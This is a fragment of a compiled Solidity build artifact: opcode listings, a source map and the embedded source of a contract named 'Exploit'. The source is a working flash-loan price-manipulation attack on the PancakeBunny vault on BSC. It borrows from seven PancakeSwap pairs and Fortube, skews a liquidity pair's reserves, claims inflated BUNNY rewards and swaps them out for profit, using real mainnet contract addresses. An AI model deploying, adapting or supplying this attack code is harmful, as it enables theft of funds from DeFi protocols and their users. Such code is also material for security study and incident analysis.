    "5062": {
      "op": "JUMPDEST"
    },
    "5063": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5065": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5067": {
      "op": "DUP3"
    },
    "5068": {
      "op": "DUP5"
    },
    "5069": {
      "op": "SUB"
    },
    "5070": {
      "op": "SLT"
    },
    "5071": {
      "op": "ISZERO"
    },
    "5072": {
      "op": "PUSH2",
      "value": "0x13D8"
    },
    "5075": {
      "op": "JUMPI"
    },
    "5076": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5078": {
      "op": "DUP1"
    },
    "5079": {
      "op": "REVERT"
    },
    "5080": {
      "op": "JUMPDEST"
    },
    "5081": {
      "op": "DUP2"
    },
    "5082": {
      "op": "MLOAD"
    },
    "5083": {
      "op": "PUSH2",
      "value": "0x13E3"
    },
    "5086": {
      "op": "DUP2"
    },
    "5087": {
      "op": "PUSH2",
      "value": "0x1246"
    },
    "5090": {
      "jump": "i",
      "op": "JUMP"
    },
    "5091": {
      "op": "JUMPDEST"
    },
    "5092": {
      "op": "SWAP4"
    },
    "5093": {
      "op": "SWAP3"
    },
    "5094": {
      "op": "POP"
    },
    "5095": {
      "op": "POP"
    },
    "5096": {
      "op": "POP"
    },
    "5097": {
      "jump": "o",
      "op": "JUMP"
    },
    "5098": {
      "op": "JUMPDEST"
    },
    "5099": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5101": {
      "op": "DUP3"
    },
    "5102": {
      "op": "DUP3"
    },
    "5103": {
      "op": "LT"
    },
    "5104": {
      "op": "ISZERO"
    },
    "5105": {
      "op": "PUSH2",
      "value": "0x13FC"
    },
    "5108": {
      "op": "JUMPI"
    },
    "5109": {
      "op": "PUSH2",
      "value": "0x13FC"
    },
    "5112": {
      "op": "PUSH2",
      "value": "0x1316"
    },
    "5115": {
      "jump": "i",
      "op": "JUMP"
    },
    "5116": {
      "op": "JUMPDEST"
    },
    "5117": {
      "op": "POP"
    },
    "5118": {
      "op": "SUB"
    },
    "5119": {
      "op": "SWAP1"
    },
    "5120": {
      "jump": "o",
      "op": "JUMP"
    },
    "5121": {
      "op": "JUMPDEST"
    },
    "5122": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5124": {
      "op": "DUP2"
    },
    "5125": {
      "op": "MLOAD"
    },
    "5126": {
      "op": "DUP1"
    },
    "5127": {
      "op": "DUP5"
    },
    "5128": {
      "op": "MSTORE"
    },
    "5129": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5131": {
      "op": "JUMPDEST"
    },
    "5132": {
      "op": "DUP2"
    },
    "5133": {
      "op": "DUP2"
    },
    "5134": {
      "op": "LT"
    },
    "5135": {
      "op": "ISZERO"
    },
    "5136": {
      "op": "PUSH2",
      "value": "0x1427"
    },
    "5139": {
      "op": "JUMPI"
    },
    "5140": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5142": {
      "op": "DUP2"
    },
    "5143": {
      "op": "DUP6"
    },
    "5144": {
      "op": "ADD"
    },
    "5145": {
      "op": "DUP2"
    },
    "5146": {
      "op": "ADD"
    },
    "5147": {
      "op": "MLOAD"
    },
    "5148": {
      "op": "DUP7"
    },
    "5149": {
      "op": "DUP4"
    },
    "5150": {
      "op": "ADD"
    },
    "5151": {
      "op": "DUP3"
    },
    "5152": {
      "op": "ADD"
    },
    "5153": {
      "op": "MSTORE"
    },
    "5154": {
      "op": "ADD"
    },
    "5155": {
      "op": "PUSH2",
      "value": "0x140B"
    },
    "5158": {
      "op": "JUMP"
    },
    "5159": {
      "op": "JUMPDEST"
    },
    "5160": {
      "op": "DUP2"
    },
    "5161": {
      "op": "DUP2"
    },
    "5162": {
      "op": "GT"
    },
    "5163": {
      "op": "ISZERO"
    },
    "5164": {
      "op": "PUSH2",
      "value": "0x1439"
    },
    "5167": {
      "op": "JUMPI"
    },
    "5168": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5170": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5172": {
      "op": "DUP4"
    },
    "5173": {
      "op": "DUP8"
    },
    "5174": {
      "op": "ADD"
    },
    "5175": {
      "op": "ADD"
    },
    "5176": {
      "op": "MSTORE"
    },
    "5177": {
      "op": "JUMPDEST"
    },
    "5178": {
      "op": "POP"
    },
    "5179": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5181": {
      "op": "ADD"
    },
    "5182": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5184": {
      "op": "NOT"
    },
    "5185": {
      "op": "AND"
    },
    "5186": {
      "op": "SWAP3"
    },
    "5187": {
      "op": "SWAP1"
    },
    "5188": {
      "op": "SWAP3"
    },
    "5189": {
      "op": "ADD"
    },
    "5190": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5192": {
      "op": "ADD"
    },
    "5193": {
      "op": "SWAP3"
    },
    "5194": {
      "op": "SWAP2"
    },
    "5195": {
      "op": "POP"
    },
    "5196": {
      "op": "POP"
    },
    "5197": {
      "jump": "o",
      "op": "JUMP"
    },
    "5198": {
      "op": "JUMPDEST"
    },
    "5199": {
      "op": "DUP5"
    },
    "5200": {
      "op": "DUP2"
    },
    "5201": {
      "op": "MSTORE"
    },
    "5202": {
      "op": "DUP4"
    },
    "5203": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5205": {
      "op": "DUP3"
    },
    "5206": {
      "op": "ADD"
    },
    "5207": {
      "op": "MSTORE"
    },
    "5208": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "5210": {
      "op": "DUP1"
    },
    "5211": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "5213": {
      "op": "SHL"
    },
    "5214": {
      "op": "SUB"
    },
    "5215": {
      "op": "DUP4"
    },
    "5216": {
      "op": "AND"
    },
    "5217": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "5219": {
      "op": "DUP3"
    },
    "5220": {
      "op": "ADD"
    },
    "5221": {
      "op": "MSTORE"
    },
    "5222": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "5224": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "5226": {
      "op": "DUP3"
    },
    "5227": {
      "op": "ADD"
    },
    "5228": {
      "op": "MSTORE"
    },
    "5229": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5231": {
      "op": "PUSH2",
      "value": "0x147B"
    },
    "5234": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "5236": {
      "op": "DUP4"
    },
    "5237": {
      "op": "ADD"
    },
    "5238": {
      "op": "DUP5"
    },
    "5239": {
      "op": "PUSH2",
      "value": "0x1401"
    },
    "5242": {
      "jump": "i",
      "op": "JUMP"
    },
    "5243": {
      "op": "JUMPDEST"
    },
    "5244": {
      "op": "SWAP7"
    },
    "5245": {
      "op": "SWAP6"
    },
    "5246": {
      "op": "POP"
    },
    "5247": {
      "op": "POP"
    },
    "5248": {
      "op": "POP"
    },
    "5249": {
      "op": "POP"
    },
    "5250": {
      "op": "POP"
    },
    "5251": {
      "op": "POP"
    },
    "5252": {
      "jump": "o",
      "op": "JUMP"
    },
    "5253": {
      "op": "JUMPDEST"
    },
    "5254": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5256": {
      "op": "DUP2"
    },
    "5257": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5259": {
      "op": "NOT"
    },
    "5260": {
      "op": "DIV"
    },
    "5261": {
      "op": "DUP4"
    },
    "5262": {
      "op": "GT"
    },
    "5263": {
      "op": "DUP3"
    },
    "5264": {
      "op": "ISZERO"
    },
    "5265": {
      "op": "ISZERO"
    },
    "5266": {
      "op": "AND"
    },
    "5267": {
      "op": "ISZERO"
    },
    "5268": {
      "op": "PUSH2",
      "value": "0x149F"
    },
    "5271": {
      "op": "JUMPI"
    },
    "5272": {
      "op": "PUSH2",
      "value": "0x149F"
    },
    "5275": {
      "op": "PUSH2",
      "value": "0x1316"
    },
    "5278": {
      "jump": "i",
      "op": "JUMP"
    },
    "5279": {
      "op": "JUMPDEST"
    },
    "5280": {
      "op": "POP"
    },
    "5281": {
      "op": "MUL"
    },
    "5282": {
      "op": "SWAP1"
    },
    "5283": {
      "jump": "o",
      "op": "JUMP"
    },
    "5284": {
      "op": "JUMPDEST"
    },
    "5285": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5287": {
      "op": "DUP3"
    },
    "5288": {
      "op": "PUSH2",
      "value": "0x14C1"
    },
    "5291": {
      "op": "JUMPI"
    },
    "5292": {
      "op": "PUSH4",
      "value": "0x4E487B71"
    },
    "5297": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "5299": {
      "op": "SHL"
    },
    "5300": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5302": {
      "op": "MSTORE"
    },
    "5303": {
      "op": "PUSH1",
      "value": "0x12"
    },
    "5305": {
      "op": "PUSH1",
      "value": "0x4"
    },
    "5307": {
      "op": "MSTORE"
    },
    "5308": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "5310": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5312": {
      "op": "REVERT"
    },
    "5313": {
      "op": "JUMPDEST"
    },
    "5314": {
      "op": "POP"
    },
    "5315": {
      "op": "DIV"
    },
    "5316": {
      "op": "SWAP1"
    },
    "5317": {
      "jump": "o",
      "op": "JUMP"
    },
    "5318": {
      "op": "JUMPDEST"
    },
    "5319": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5321": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5323": {
      "op": "DUP3"
    },
    "5324": {
      "op": "DUP5"
    },
    "5325": {
      "op": "SUB"
    },
    "5326": {
      "op": "SLT"
    },
    "5327": {
      "op": "ISZERO"
    },
    "5328": {
      "op": "PUSH2",
      "value": "0x14D8"
    },
    "5331": {
      "op": "JUMPI"
    },
    "5332": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5334": {
      "op": "DUP1"
    },
    "5335": {
      "op": "REVERT"
    },
    "5336": {
      "op": "JUMPDEST"
    },
    "5337": {
      "op": "POP"
    },
    "5338": {
      "op": "MLOAD"
    },
    "5339": {
      "op": "SWAP2"
    },
    "5340": {
      "op": "SWAP1"
    },
    "5341": {
      "op": "POP"
    },
    "5342": {
      "jump": "o",
      "op": "JUMP"
    },
    "5343": {
      "op": "JUMPDEST"
    },
    "5344": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5346": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5348": {
      "op": "DUP3"
    },
    "5349": {
      "op": "DUP5"
    },
    "5350": {
      "op": "SUB"
    },
    "5351": {
      "op": "SLT"
    },
    "5352": {
      "op": "ISZERO"
    },
    "5353": {
      "op": "PUSH2",
      "value": "0x14F1"
    },
    "5356": {
      "op": "JUMPI"
    },
    "5357": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5359": {
      "op": "DUP1"
    },
    "5360": {
      "op": "REVERT"
    },
    "5361": {
      "op": "JUMPDEST"
    },
    "5362": {
      "op": "DUP2"
    },
    "5363": {
      "op": "MLOAD"
    },
    "5364": {
      "op": "DUP1"
    },
    "5365": {
      "op": "ISZERO"
    },
    "5366": {
      "op": "ISZERO"
    },
    "5367": {
      "op": "DUP2"
    },
    "5368": {
      "op": "EQ"
    },
    "5369": {
      "op": "PUSH2",
      "value": "0x13E3"
    },
    "5372": {
      "op": "JUMPI"
    },
    "5373": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5375": {
      "op": "DUP1"
    },
    "5376": {
      "op": "REVERT"
    }
  },
  "sha1": "847dbb4a71f3596764dce7544a4fa993455ce3d6",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./interfaces.sol\";\n\ncontract Exploit {\n    address owner;\n    uint step;\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 BUNNY = IERC20(0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51);\n\n    \n    IZap ZapBSC = IZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);\n    IPancakeERC20 Pair_PancakeLps = IPancakeERC20(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n    IVaultFlipToFlip PancakeBunny_FLIP_USDT_BNB = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);\n\n    address[7] flashloanPairs = [\n        0x0eD7e52944161450477ee417DE9Cd3a859b14fD0, // 1051687744972121462519028\n        0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, // 522524038650282621597596\n        0x74E4716E431f45807DCF19f284c7aA99F18a4fbc, // 210158598370675048673190\n        0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082, // 133504753267096047023128\n        0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0, // 241021487428194992833789\n        0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb, // 98189677482110262659207\n        0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF  // 66290233896773473957091\n    ];\n\n    IFortubeBank FortubeBank = IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672); //2961750450987026369366661\n    IPancakePair PancakeBunny_FLIP_USDT_BNB_v1 = IPancakePair(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);\n    IPancakePair WBNB_BUNNY = IPancakePair(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);\n    IPancakeRouter01 router = IPancakeRouter01(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner(){\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    // Start with the first tx\n    function start() public onlyOwner {\n        WBNB.approve(address(ZapBSC), 1e18);\n        ZapBSC.zapInToken(address(WBNB), 1e18, address(Pair_PancakeLps));\n\n        uint received_LPs = Pair_PancakeLps.balanceOf(address(this));\n        Pair_PancakeLps.approve(address(PancakeBunny_FLIP_USDT_BNB), received_LPs);\n        PancakeBunny_FLIP_USDT_BNB.deposit(received_LPs);\n    }\n\n    function main() external {\n        (uint amount0, uint amount1, ) = IPancakePair(flashloanPairs[0]).getReserves();\n        if (address(WBNB) == IPancakePair(flashloanPairs[0]).token1()){ \n            IPancakePair(flashloanPairs[0]).swap(0, amount1 - 1, address(this), abi.encode(0, 1));\n        } else {\n            IPancakePair(flashloanPairs[0]).swap(amount0 - 1, 0, address(this), abi.encode(0, 0));\n        }\n        //WBNB.transfer(address(this), WBNB.balanceOf(address(this)));\n        //BSC_USD.transfer(address(this), BSC_USD.balanceOf(address(this)));\n    }\n\n    function pancakeCall(address _sender, uint _amount0Out, uint _amount1Out, bytes calldata _data) external {\n        (, uint asset) = abi.decode(_data, (uint, uint));\n        step += 1;\n        if(step < 7){\n            (uint amount0, uint amount1, ) = IPancakePair(flashloanPairs[step]).getReserves();\n            if (address(WBNB) == IPancakePair(flashloanPairs[step]).token1()){ // case where WBNB == token1\n                IPancakePair(flashloanPairs[step]).swap(0, amount1 - 1, address(this), abi.encode(0, 1));\n            } else { // case where WBNB == token0\n                IPancakePair(flashloanPairs[step]).swap(amount0 - 1, 0, address(this), abi.encode(0, 0));\n            }\n        } else { // on the last call take flashloan from fortube\n            FortubeBank.flashloan(address(this), address(BSC_USD), 2961750450987026369366661, \"0x\");\n        }\n\n        //repay each PCS flashloan\n        uint256 retAmount = asset == 0 ? ((_amount0Out * 10000) / 9975 + 1) : ((_amount1Out * 10000) / 9975 + 1);\n        require(WBNB.balanceOf(address(this)) >= retAmount, \"not making proift\");\n        WBNB.transfer(msg.sender, retAmount);\n    }\n    \n    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) public {\n        attack();\n\n        BSC_USD.transfer(FortubeBank.controller(), 2961750450987026369366661 + 2369400360789621095493);\n    } \n\n    function attack() private {\n        uint WBNB_amount = WBNB.balanceOf(address(this)) - 15000e18;\n\n        // add loaned liquidity\n        WBNB.approve(address(ZapBSC), type(uint256).max);\n        ZapBSC.zapInToken(address(WBNB), 15000e18, address(Pair_PancakeLps));\n        Pair_PancakeLps.transfer(address(Pair_PancakeLps), Pair_PancakeLps.balanceOf(address(this)));\n\n        // pair PancakeBunny_FLIP_USDT_BNB manipulation\n        (uint amount_0, uint amount_1, ) = IPancakePair(PancakeBunny_FLIP_USDT_BNB_v1).getReserves();\n        \n        uint amount_In = WBNB_amount;\n        uint amount_Out = router.getAmountOut(amount_In, amount_1, amount_0);\n        WBNB.transfer(address(PancakeBunny_FLIP_USDT_BNB_v1), amount_In);\n        PancakeBunny_FLIP_USDT_BNB_v1.swap(amount_Out, 0, address(this), \"\");\n\n        PancakeBunny_FLIP_USDT_BNB.getReward();\n\n        uint bunnyBalance = BUNNY.balanceOf(address(this)) - 1;\n        (uint amount0, uint amount1, ) = WBNB_BUNNY.getReserves();\n        uint amountIn = bunnyBalance;\n        uint amountOut = router.getAmountOut(bunnyBalance, amount1, amount0);\n\n        BUNNY.transfer(address(WBNB_BUNNY), amountIn);\n        WBNB_BUNNY.swap(amountOut, 0, address(this), \"\");\n    }\n}",
  "sourceMap": "143:64:0:-:0;;;-1:-1:-1;;;;;;143:64:0;;;164:42;143:64;;;;213:67;;;;;237:42;213:67;;;286:65;;;;;308:42;286:65;;;363:62;;;;;382:42;363:62;;;431:89;;;;;477:42;431:89;;;526:106;;;;;;589:42;526:106;;;639:594;85:5339;639:594;677:42;85:5339;639:594;;;758:42;639:594;;838:42;639:594;;918:42;639:594;;998:42;143:64;639:594;1078:42;639:594;;1157:42;639:594;;;;;;85:5339;639:594;:::i;:::-;-1:-1:-1;1240:83:0;;;-1:-1:-1;;;;;;1240:83:0;;;1280:42;1240:83;;;;1357:101;;;;;1415:42;1357:101;;;1464:82;;;;;1503:42;1464:82;;;1552:95;;;;;;1603:42;1552:95;;;1658:56;;;;;;;;;-1:-1:-1;1689:5:0;:18;;-1:-1:-1;;;;;;1689:18:0;1697:10;1689:18;;;85:5339;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;;85:5339:0;-1:-1:-1;;;;;85:5339:0;;;;;;;;;;;-1:-1:-1;85:5339:0;;;;;;;-1:-1:-1;85:5339:0;;;-1:-1:-1;85:5339:0;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/exploit.sol",
  "type": "contract"
}